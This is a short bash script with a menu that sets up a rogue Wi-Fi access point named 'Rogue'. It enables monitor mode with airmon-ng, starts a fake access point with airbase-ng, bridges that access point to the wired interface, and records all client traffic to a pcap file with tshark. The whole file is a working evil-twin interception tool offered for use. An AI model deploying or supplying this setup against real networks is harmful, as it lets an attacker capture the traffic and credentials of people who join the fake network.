#!/bin/bash

function rogue() {
	printf "Interface name: "
	read iface
	sudo airmon-ng start $iface
	sudo airbase-ng --essid Rogue -c 1 mon0
}

function bridge() {
	sudo brctl addbr Wifi-Bridge
	sudo brctl addif Wifi-Bridge eth0
	sudo brctl addif Wifi-Bridge at0
}

function sniff() {
	tshark -i at0 -q -w output.pcap
}

clear
echo "Please select an option."
PS3='>> '
list="Launch Bridge Sniffing Exit"

select i in $list
do
	if [ $i = "Launch" ]; then
		rogue
	elif [ $i = "Bridge" ]; then
		bridge
	elif [ $i = "Sniffing" ]; then
		sniff
	elif [ $i = "Exit" ]; then
		exit
	fi
break
done
